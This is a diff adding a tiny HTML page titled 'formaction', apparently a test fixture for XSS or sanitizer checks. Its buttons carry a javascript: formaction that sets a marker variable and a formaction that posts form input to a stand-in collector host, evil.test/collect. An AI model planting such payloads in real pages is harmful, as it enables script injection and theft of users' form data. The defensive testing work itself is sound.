@@ -1,0 +1,9 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8">
+<title>formaction</title>
+</head>
+<body>
+<form action="https://evil.test/c" target=_blank><input name=q><button id=b formaction="javascript:window.__vmExecuted=true">x</button><button id=b2 formaction="https://evil.test/collect" formmethod=post formtarget=_blank>y</button></form>
+</body>
+</html>
